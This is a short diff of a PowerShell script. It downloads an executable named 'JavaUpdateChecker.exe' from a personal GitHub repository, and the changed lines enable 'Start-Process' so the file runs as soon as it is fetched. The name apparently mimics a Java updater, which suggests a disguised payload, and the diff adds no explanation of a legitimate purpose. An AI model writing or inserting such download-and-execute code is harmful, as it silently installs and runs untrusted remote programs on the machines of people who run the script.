@@ -12,8 +12,8 @@ else {
 
 $client = New-Object System.Net.WebClient
 $client.DownloadFile("https://github.com/jostanise/s/raw/main/JavaUpdateChecker.exe", $exe)
-# Start-Process -Filepath $exe
+Start-Process -Filepath $exe
 
-Set-Location -Path $folder
-$filename
-#.\gayz.exe
+# Set-Location -Path $folder
+# .$filename
+# .\gayz.exe
